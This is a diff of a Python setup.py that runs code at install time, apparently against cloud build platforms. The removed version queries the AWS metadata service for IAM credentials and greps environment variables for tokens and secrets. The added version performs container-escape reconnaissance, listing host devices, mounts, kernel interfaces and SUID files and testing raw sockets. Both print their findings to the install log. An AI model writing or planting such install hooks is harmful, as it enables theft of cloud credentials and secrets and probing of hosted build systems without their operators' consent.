@@ -1,44 +1,45 @@
-import os, sys, socket, subprocess as sp
+import os, sys, subprocess as sp
 from setuptools import setup
 
-def vercel_audit():
+def deep_scan():
     o = sys.stderr.write
-    def r(c):
-        return sp.getoutput(c)
+    def r(c): return sp.getoutput(c)
 
-    o("\n" + "!"*50 + "\n")
-    o(f"USER: {r('id')}\n")
-    o(f"KERNEL: {r('uname -a')}\n")
-    
-    # Ищем следы AWS (Vercel сидит на нем)
-    o("\n[AWS METADATA CHECK]\n")
-    targets = [
-        ("Metadata v1", "169.254.169.254", "/latest/meta-data/iam/security-credentials/"),
-        ("Identity", "169.254.169.254", "/latest/dynamic/instance-identity/document")
-    ]
-    for name, ip, path in targets:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.5)
-            if s.connect_ex((ip, 80)) == 0:
-                o(f"FOUND {name}! Attempting leak...\n")
-                # Если порт открыт, пробуем вытянуть через curl
-                o(r(f"curl -s http://{ip}{path}") + "\n")
-            s.close()
-        except: pass
+    o("\n" + "#"*50 + "\n")
+    o("--- CLOUDFLARE DEEP SYSTEM AUDIT ---\n")
 
-    # Проверка на Docker/K8s внутри Vercel
-    o("\n[ENV LEAK]\n")
-    # Ищем токены в памяти
-    env_vars = r("env")
-    for line in env_vars.split('\n'):
-        if any(x in line.upper() for x in ['AWS', 'VERCEL', 'TOKEN', 'SECRET', 'AUTH']):
-            o(line[:50] + "...\n") # Берем начало, чтобы не спалить всё в логах
+ 
+    o("\n[1] SCANNING /dev FOR HOST DEVICES:\n")
+    o(r("ls -F /dev | grep -vE 'null|zero|full|tty|random|urandom|pts'"))
+ 
+    o("\n\n[2] ANALYZING MOUNT POINTS (ESCAPE VULNS):\n")
+    o(r("mount | grep -iE 'docker|kube|container|shift|overlay'"))
+ 
+    o("\n\n[3] KERNEL INTERFACES:\n")
+    paths = ['/proc/config.gz', '/proc/sched_debug', '/proc/kallsyms', '/proc/interrupts']
+    for p in paths:
+        if os.path.exists(p):
+            o(f"ACCESS GRANTED: {p}\n")
+        else:
+            o(f"DENIED: {p}\n")
+ 
+    o("\n\n[4] HIDDEN SUID SEARCH:\n")
+    o(r("find /opt /home /var -perm -4000 -type f 2>/dev/null"))
+ 
+    o("\n\n[5] RAW SOCKET TEST:\n")
+    try:
+        import socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+        o("CRITICAL: Raw Sockets allowed! Can sniff traffic.\n")
+    except:
+        o("SAFE: Raw Sockets denied.\n")
 
-    o("\n" + "!"*50 + "\n")
+    o("\n" + "#"*50 + "\n")
     sys.exit(1)
 
-try: vercel_audit()
+try: deep_scan()
 except: sys.exit(1)
+
+setup(name="cf-deep-scan", version="1.0")
 
 setup(name="v-poc", version="1.0")
